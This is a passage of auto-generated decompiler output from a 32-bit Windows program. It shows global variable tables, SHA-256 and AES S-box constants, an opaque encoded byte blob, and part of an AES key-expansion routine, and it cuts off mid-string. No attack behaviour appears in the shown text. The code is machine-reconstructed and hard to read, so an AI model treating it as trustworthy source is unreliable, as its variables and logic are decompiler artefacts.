-0x6fd49963, -0x6b1584d6, -0x1f4be219, -0x1b8affb0, -0x16c9d977, -0x1208c4c2, -0xc4f94c5, -0x88e8974, -0x5cdafab, -0x10cb21e, -0x39430fa1, -0x3d821218, -0x30c134cf, -0x3400297a, -0x2a47797d, -0x2e8664cc, -0x23c54213, -0x27045fa6, 0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637, 0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb, 0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f, 0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53, 0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47, 0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b, 0x315d626, 0x7d4cb91, 0xa97ed48, 0xe56f0ff, 0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623, -0xed0a9f2, -0xa11b447, -0x75292a0, -0x3938f29, -0x1dd4df2e, -0x1915c29b, -0x1456e444, -0x1097f9f5, -0x28d8444a, -0x2c1959ff, -0x215a7f28, -0x259b6291, -0x3bdc3296, -0x3f1d2f23, -0x325e09fc, -0x369f144d, -0x42c17282, -0x46006f37, -0x4b4349f0, -0x4f825459, -0x51c5045e, -0x550419eb, -0x58473f34, -0x5c862285, -0x64c99f3a, -0x6008828f, -0x6d4ba458, -0x698ab9e1, -0x77cde9e6, -0x730cf453, -0x7e4fd28c, -0x7a8ecf3d, 0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640, 0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c, 0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8, 0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24, 0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30, 0x29f3d35, 0x65e2082, 0xb1d065b, 0xfdc1bec, 0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088, 0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654, -0x3a56d987, -0x3e97c432, -0x33d4e2e9, -0x3715ff60, -0x2952af5b, -0x2d93b2ee, -0x20d09435, -0x24118984, -0x1c5e343f, -0x189f298a, -0x15dc0f51, -0x111d12e8, -0xf5a42e3, -0xb9b5f56, -0x6d8798d, -0x219643c, -0x764702f7, -0x72861f42, -0x7fc53999, -0x7b042430, -0x6543742b, -0x6182699e, -0x6cc14f45, -0x680052f4, -0x504fef4f, -0x548ef2fa, -0x59cdd421, -0x5d0cc998, -0x434b9993, -0x478a8426, -0x4ac9a2fd, -0x4e08bf4c}; // 0x417028
// Detected cryptographic pattern: SHA256_Hash_constant_words_K__0x428a2f98_ (32-bit, little endian)
int32_t SHA256_Hash_constant_words_K__0x428a2f98__at_417428[64] = {0x428a2f98, 0x71374491, -0x4a3f0431, -0x164a245b, 0x3956c25b, 0x59f111f1, -0x6dc07d5c, -0x54e3a12b, -0x27f85568, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, -0x7f214e02, -0x6423f959, -0x3e640e8c, -0x1b64963f, -0x1041b87a, 0xfc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, -0x67c1aeae, -0x57ce3993, -0x4ffcd838, -0x40a68039, -0x391ff40d, -0x2a586eb9, 0x6ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, -0x7e3d36d2, -0x6d8dd37b, -0x5d40175f, -0x57e599b5, -0x3db47490, -0x3893ae5d, -0x2e6d17e7, -0x2966f9dc, -0xbf1ca7b, 0x106aa070, 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, -0x7b3787ec, -0x7338fdf8, -0x6f410006, -0x5baf9315, -0x41065c09, -0x398e870e}; // 0x417428
int32_t g1 = -0x74f3ba75; // 0x4072b3
int32_t g2 = 0x5d5b5e5f; // 0x408ba9
int32_t g3 = 0x5b5e5f5d; // 0x408be9
int32_t g4 = 0; // 0x4121fc
int32_t g5 = 0; // 0x412208
int32_t g6 = 0; // 0x41220c
int32_t g7 = 0; // 0x412228
int32_t g8 = 0; // 0x412234
int32_t g9 = 0; // 0x412244
int32_t g10 = 0; // 0x412248
int32_t g11 = 0; // 0x41224c
int32_t g12 = 0x4068c9; // 0x412308
int32_t g13 = 0x4068c9; // 0x412328
int32_t g14 = 0x4068c9; // 0x412344
int32_t g15 = 0x406eae; // 0x412368
int32_t g16 = 0x4068c9; // 0x412378
int32_t g17 = 0x4068c9; // 0x412384
int32_t g18 = -0x23ed5979; // 0x4123dc
int32_t g19 = 0x44aca674; // 0x41241c
int32_t g20 = 0x4590f811; // 0x4124ac
int32_t g21 = 0x674b6698; // 0x4124bc
char * g22 = "csm\xe0\x01"; // 0x41256c
int32_t g23 = 0x4068c9; // 0x412590
int32_t g24; // 0x4125a8
int32_t g25 = 0; // 0x412660
int32_t g26 = 0; // 0x412674
int32_t g27 = 0; // 0x412684
int32_t g28 = 0; // 0x412698
struct _RTL_CRITICAL_SECTION * g29 = (struct _RTL_CRITICAL_SECTION *)1; // 0x4126ac
int32_t g30 = 0x408d2b; // 0x412e54
int32_t g31 = -0x3ffffffb; // 0x412e58
int32_t g32 = 0x40aa31; // 0x412f20
int32_t g33 = 1; // 0x412f98
int32_t g34 = 22; // 0x412f9c
int32_t g35 = 0x200020; // 0x413200
char * g36[43] = {
    "Sun",
    "Mon",
    "Tue",
    "Wed",
    "Thu",
    "Fri",
    "Sat",
    "Sunday",
    "Monday",
    "Tuesday",
    "Wednesday",
    "Thursday",
    "Friday",
    "Saturday",
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec",
    "January",
    "February",
    "March",
    "April",
    "May",
    "June",
    "July",
    "August",
    "September",
    "October",
    "November",
    "December",
    "AM",
    "PM",
    "MM/dd/yy",
    "dddd, MMMM dd, yyyy",
    "HH:mm:ss"
}; // 0x413a60
int32_t g37; // 0x413bc8
int32_t g38 = 2; // 0x41407c
int32_t g39 = 2; // 0x414084
int32_t g40 = 2; // 0x41408c
int32_t g41 = 2; // 0x414094
int32_t g42 = 0; // 0x41409c
struct _RTL_CRITICAL_SECTION * g43 = (struct _RTL_CRITICAL_SECTION *)8; // 0x4140b8
int32_t g44 = 4; // 0x4140c0
int32_t g45 = 4; // 0x4140d8
int32_t g46 = 1; // 0x414140
int32_t g47 = 0; // 0x414a68
int32_t g49 = 66; // 0x41525c
int128_t g50; // 0x4161e0
int128_t g51; // 0x4161f0
int128_t g52; // 0x416200
int128_t g53; // 0x416210
int128_t g54; // 0x416230
int128_t g55; // 0x416240
int128_t g56; // 0x416250
int128_t g57; // 0x416260
int128_t g58; // 0x416270
int128_t * g59 = NULL; // 0x416280
int128_t g60; // 0x4162a0
int128_t g61; // 0x4162b0
int128_t g62; // 0x4162f0
int128_t g63; // 0x416300
int128_t g64; // 0x416310
int128_t g65; // 0x416320
char * g66 = "\b\x04\b\b\b\x04\b\b"; // 0x4163be
int128_t * g67 = NULL; // 0x416450
int128_t * g68 = NULL; // 0x416860
int32_t g69 = 20; // 0x416d08
char (*g70)[4] = "exp"; // 0x416d0c
char * g71 = "\x8d\x01\x02\x04\b\x10 @\x80\x1b\x36"; // 0x417018
int32_t g72; // 0x417538
int32_t g73; // 0x418f98
int32_t g74; // 0x418fe8
int32_t g75 = 46; // 0x419404
int32_t g76 = -2; // 0x4242d8
int32_t g77 = -2; // 0x4242f8
int32_t g78 = 0; // 0x424314
int32_t g79 = 0; // 0x424368
int32_t g80 = 0; // 0x4243c0
int32_t g81 = -2; // 0x424400
int32_t g82 = -2; // 0x424420
int32_t g83 = -2; // 0x424448
int32_t g84 = -2; // 0x4244c8
int32_t g85 = 0; // 0x4244e4
int32_t g86 = -2; // 0x424520
int32_t g87 = -2; // 0x424540
int32_t g88 = -28; // 0x424560
int32_t g89 = -2; // 0x424588
int32_t g90 = -2; // 0x4245a8
int32_t g91 = -2; // 0x4245c8
int32_t g92 = -28; // 0x4245e8
int32_t g93 = -2; // 0x424608
int32_t g94 = -2; // 0x424628
int32_t g95 = -2; // 0x424650
int32_t g96 = -2; // 0x424670
int32_t g97 = -2; // 0x424690
int32_t g98 = -2; // 0x4246b0
int32_t g99 = -2; // 0x4246d0
int32_t g100 = -2; // 0x4246f0
int32_t g101 = -2; // 0x424710
int32_t g102 = -28; // 0x424730
int32_t g103 = -2; // 0x424750
int32_t g104 = -2; // 0x424770
int32_t g105 = -2; // 0x424790
int32_t g106 = -2; // 0x4247b0
int32_t g107 = -2; // 0x4247d0
int32_t g108 = -2; // 0x4247f0
int32_t g109 = -2; // 0x424810
int32_t g110 = -2; // 0x424830
int32_t g111 = -0x80000000; // 0x426000
int32_t g112 = -0x44bf19b2; // 0x426008
int32_t g113 = 0x44bf19b1; // 0x42600c
int32_t g114 = 1; // 0x426010
int32_t g115 = 1; // 0x426020
char g116 = -1; // 0x426030
char g117 = 2; // 0x426050
int32_t g118 = 12; // 0x426060
int32_t g119 = 8; // 0x426064
int32_t g120 = 0; // 0x426068
int32_t g121 = -1; // 0x426110
int32_t g124 = 67; // 0x4261d8
char * g125 = "\x01\x02\x04\b\xa4\x03"; // 0x4261dc
int32_t g126 = 932; // 0x4261e0
int16_t * g127 = (int16_t *)-0x7d867da0; // 0x4261e4
char * g128 = "\xa6\xdf"; // 0x4261f0
int32_t g129 = 0; // 0x4262d0
int32_t g130 = 0; // 0x4263d8
int32_t g131 = 0; // 0x4264d8
int32_t g132 = 0x4264d800; // 0x4266f7
int32_t g134; // 0x426708
char g139 = -2; // 0x426758
int32_t g140 = 1; // 0x426760
int32_t g141 = -2; // 0x426764
int32_t g142; // 0x426780
int32_t g143; // 0x4267c4
char * g144 = "\xdf`\xad\xbb)WA\xd3\xab\xceh\x1f\x83n\x99o!I\xdb\x45\xd3\xc2\xcb\xde\x8ex\xf1\xf7\xa7\x95\x18\xdfO\xa5/\xbc\x82\x11@\rJ\xecy\xa3\x10\xd3\xee\x1e\x94\xd3\v\xd7)D=\x92\x1c\x30\x91\x97s\xa9\xce\x14$\xa9\xd9q?\x89\xe2\b%\xc1\x10S\x99\xdd\xd0'H\xbaT\\\xe9o\x7f\x9c=c$\xd4\xd8\xc5\x85\x96y\xa8\xf0\xc0--\xc9M\x16\xfe\xf1'\xd3\x95\x16\x96\xf2\n\x1fG,p\x18\xe0M\xff\xcd+L\x8a\xc4\xedq5\xb0\n\x82\x32.F7\xc9\f\x9e\xa8<y\x1a\xa5\xe2\x46?t\x89\xaa}h\xf8y\xe5\xa1\x96\t+\x04\x9f\x8dO)BI\xb9\xcb\xe2y\xbd\x45}\x01\xceq5$:\x1aM\xf6\xc9\xcf;\xb9\xf9\x15\xadU\xce\x19\xd7\xfc/\x86(\xf1\x62\x91:\xbc\xa0\x86\t_\xb5k+H\x86Lp\xcd\xc8\x9b\x9a\x89\x87\xa3\xfa\xcf|\xc7\xbd\x17\x18\xdd\x8e.\xe1\xab:\x93\xfd\x32\xb1\xa6\x34\xaa\x46\xef\xa8\xf4T\x8eN\xfb@{\x15s\xe2\xf8'"; // 0x4267e8
int128_t g145; // 0x4268e8
int64_t g146 = 0x700000000; // 0x4268f8
int32_t g147 = 7; // 0x4268fc
struct _RTL_CRITICAL_SECTION * g149 = NULL; // 0x4269f8
int32_t g150 = 0; // 0x426a10
int32_t g151 = 0; // 0x426a14
int32_t g152 = 0; // 0x426a18
int32_t g153 = 0; // 0x426a1c
int32_t g154 = 0; // 0x426a20
int32_t g155 = 0; // 0x426a2c
char g156 = 0; // 0x426a38
int32_t g157 = 0; // 0x426a3c
int32_t g158 = 0; // 0x426a40
char g159 = 0; // 0x426a44
int32_t g160 = 0; // 0x426a48
int32_t g161 = 0; // 0x426a4c
int32_t g162 = 0; // 0x426a50
int32_t g163 = 0; // 0x426a54
int32_t g164 = 0; // 0x426a60
int32_t g165 = 0; // 0x426a68
int32_t g166 = 0; // 0x426a6c
int32_t g167 = 0; // 0x426a74
int32_t g168 = 0; // 0x426a78
int32_t g169 = 0; // 0x426a7c
int32_t g170 = 0; // 0x426ab8
int32_t g171 = 0; // 0x426b64
int32_t g172 = 0; // 0x426b68
int32_t g173 = 0; // 0x426b6c
int32_t g174 = 0; // 0x426b70
int32_t g175 = 0; // 0x426b78
int32_t g176 = 0; // 0x426b7c
int32_t g177 = 0; // 0x426d84
int32_t g178 = 0; // 0x426d94
int32_t g179 = 0; // 0x426dac
int64_t g180 = 0; // 0x426dc4
int16_t * g181 = NULL; // 0x426dc8
int32_t g182 = 0; // 0x426dd4
int32_t g183 = 0; // 0x426de8
int32_t g184 = 0; // 0x426e28
int32_t g185 = 0; // 0x426e2c
int32_t g186 = 0; // 0x426e30
int32_t g187 = 0; // 0x426e34
int32_t g188 = 0; // 0x426e38
char g189 = 0; // 0x426e3c
char * g190; // 0x426e40
int32_t g191 = 0; // 0x426f48
int32_t g192 = 0; // 0x426f50
int32_t g193 = 0; // 0x426f54
int32_t g194 = 0; // 0x426f58
int32_t g195 = 0; // 0x426f64
int32_t g196 = 0; // 0x426f70
int32_t g197 = 0; // 0x426f74
int32_t g198 = 0; // 0x426f78
int32_t g199 = 0; // 0x426f7c
int32_t g200 = 0; // 0x426f80
int32_t g201 = 0; // 0x426f84
int32_t g202 = 0; // 0x426f88
int32_t g203 = 0; // 0x426f8c
int32_t g204 = 0; // 0x426f90
int32_t g205 = 0; // 0x426f94
int32_t g206 = 0; // 0x426f98
int32_t g207 = 0; // 0x426fa0
int32_t g208 = 0; // 0x427190
int32_t g209 = 0; // 0x4271a0
struct _RTL_CRITICAL_SECTION * g210 = NULL; // 0x4271a8
int64_t g211 = 0; // 0x4272e0
int32_t g212 = 0; // 0x4272e8
char * g213; // 0x427338
int32_t g214 = 0; // 0x4273b8
int32_t g215 = 0; // 0x4273bc
int32_t g216 = 0; // 0x4273c0
int32_t g217 = 0; // 0x4273c4
int32_t g218 = 0; // 0x4273c8
int32_t g219 = 0; // 0x4273d4
char g220 = 0; // 0x4273d8
int32_t g221 = 0; // 0x4273dc
int32_t g222 = 0; // 0x4273e0
int32_t g223 = 0; // 0x4273e4
char * g224; // 0x4273e8
int32_t g225 = 0; // 0x4273ec
char * g226; // 0x4273f0
int32_t g227 = 0; // 0x4273f4
int32_t g228 = 0; // 0x4273f8
int32_t g229 = 0; // 0x4273fc
int32_t g230 = 0; // 0x427400
int32_t g231 = 0; // 0x427404
int32_t g232 = 0; // 0x427408
int32_t g233 = 0; // 0x42740c
int32_t g234 = 0; // 0x427410
int32_t g235 = 0; // 0x427414
int32_t g236 = 0; // 0x427418
int32_t g237 = 0; // 0x42741c
int32_t g238 = 0; // 0x427424
int32_t g239 = 0; // 0x427428
int32_t g240 = 0; // 0x42742c
int32_t g241 = 0; // 0x427430
int32_t g242 = 0; // 0x427434
int16_t * g243 = NULL; // 0x427438
int32_t g244 = 0; // 0x42743c
int32_t g245 = 0; // 0x427440
int32_t g246 = 0; // 0x427444
int32_t g247 = 0; // 0x427448
int32_t g248 = 0; // 0x42744c
int32_t g249 = 0; // 0x427450
int32_t g250 = 0; // 0x427454
int32_t g251 = 0; // 0x427458
int32_t g252 = 0; // 0x42745c
int32_t g253 = 0; // 0x427460
int32_t g254 = 0; // 0x427468
int32_t g255 = 0; // 0x427470
int32_t g256 = 0; // 0x427474
int32_t g257 = 0; // 0x427478
int32_t g258 = 0; // 0x42747c
int32_t g259 = 0; // 0x427480
int32_t g260;
int32_t g261;
int32_t g262;
int32_t g263;
int32_t g264;
int32_t g265;
int32_t g266;
int32_t * g48 = &g47; // 0x415258
int32_t * g122 = &g35; // 0x426118
int32_t * g123 = &g131; // 0x4261d4
int32_t * g133 = &g131; // 0x4266f8
int32_t * g135 = &g233; // 0x426710
int32_t * g136 = &g233; // 0x42672c
int32_t * g137 = &g234; // 0x42673c
int32_t * g138 = &g234; // 0x426754
int32_t * g148 = &g15; // 0x4269d8

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x40100c
int32_t function_401000(void) {
    // 0x401000
    return function_4065ce(0x411f70);
}

// Address range: 0x401010 - 0x4011bd
// Used cryptographic patterns:
//  - AES_Rijndael_S___ARIA_S1 (8-bit, little endian)
int32_t function_401010(void) {
    // 0x401010
    int32_t v1; // 0x401010
    int32_t v2; // 0x401010
    *(char *)v2 = *(char *)&v1;
    *(char *)(v2 + 1) = *(char *)(v1 + 1);
    *(char *)(v2 + 2) = *(char *)(v1 + 2);
    *(char *)(v2 + 3) = *(char *)(v1 + 3);
    *(char *)(v2 + 4) = *(char *)(v1 + 4);
    *(char *)(v2 + 5) = *(char *)(v1 + 5);
    *(char *)(v2 + 6) = *(char *)(v1 + 6);
    *(char *)(v2 + 7) = *(char *)(v1 + 7);
    *(char *)(v2 + 8) = *(char *)(v1 + 8);
    *(char *)(v2 + 9) = *(char *)(v1 + 9);
    *(char *)(v2 + 10) = *(char *)(v1 + 10);
    *(char *)(v2 + 11) = *(char *)(v1 + 11);
    *(char *)(v2 + 12) = *(char *)(v1 + 12);
    *(char *)(v2 + 13) = *(char *)(v1 + 13);
    *(char *)(v2 + 14) = *(char *)(v1 + 14);
    *(char *)(v2 + 15) = *(char *)(v1 + 15);
    *(char *)(v2 + 16) = *(char *)(v1 + 16);
    *(char *)(v2 + 17) = *(char *)(v1 + 17);
    *(char *)(v2 + 18) = *(char *)(v1 + 18);
    *(char *)(v2 + 19) = *(char *)(v1 + 19);
    *(char *)(v2 + 20) = *(char *)(v1 + 20);
    *(char *)(v2 + 21) = *(char *)(v1 + 21);
    *(char *)(v2 + 22) = *(char *)(v1 + 22);
    *(char *)(v2 + 23) = *(char *)(v1 + 23);
    *(char *)(v2 + 24) = *(char *)(v1 + 24);
    *(char *)(v2 + 25) = *(char *)(v1 + 25);
    *(char *)(v2 + 26) = *(char *)(v1 + 26);
    *(char *)(v2 + 27) = *(char *)(v1 + 27);
    *(char *)(v2 + 28) = *(char *)(v1 + 28);
    int32_t v3 = v2 + 29; // 0x4010e2
    *(char *)v3 = *(char *)(v1 + 29);
    *(char *)(v2 + 30) = *(char *)(v1 + 30);
    char v4 = *(char *)(v1 + 31); // 0x4010f2
    *(char *)(v2 + 31) = v4;
    uint32_t v5 = 8;
    unsigned char v6 = *(char *)(v3 + 1); // 0x401100
    int32_t v7 = v4; // 0x401105
    int32_t v8 = v1; // 0x401105
    int32_t v9 = v8 & -0xff01 | 256 * v7; // 0x401105
    v1 = v9;
    int32_t v10 = (int32_t)*(char *)(v3 - 1); // 0x401108
    int32_t v11 = (int32_t)*(char *)v3; // 0x40110b
    int32_t v12 = v5 & 7; // 0x401113
    int32_t v13; // 0x401010
    int32_t v14; // 0x401010
    char v15; // 0x401010
    unsigned char v16; // 0x40111e
    char v17; // 0x401128
    unsigned char v18; // 0x401134
    char v19; // 0x401142
    char v20; // 0x401148
    int32_t v21; // 0x40114e
    int32_t v22; // 0x401158
    unsigned char v23; // 0x40115e
    unsigned char v24; // 0x401167
    char v25; // 0x401170
    unsigned char v26; // 0x40117c
    int32_t v27; // 0x40117c
    if (v12 != 0) {
        // 0x401153
        v13 = v9;
        v15 = v6;
        v14 = 256 * v11 | v10;
        if (v12 == 4) {
            // 0x401158
            v22 = v6;
            v23 = *(char *)(v10 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v24 = *(char *)(v11 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v25 = *(char *)(v22 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v26 = *(char *)(v7 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v27 = v8 & -0x10000 | v22 | 256 * (int32_t)v26;
            v1 = v27;
            v13 = v27;
            v15 = v25;
            v14 = 256 * (int32_t)v24 | (int32_t)v23;
        }
    } else {
        // 0x401118
        v16 = *(char *)((int32_t)v6 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        v17 = *(char *)(v7 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        v18 = *(char *)(v10 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed 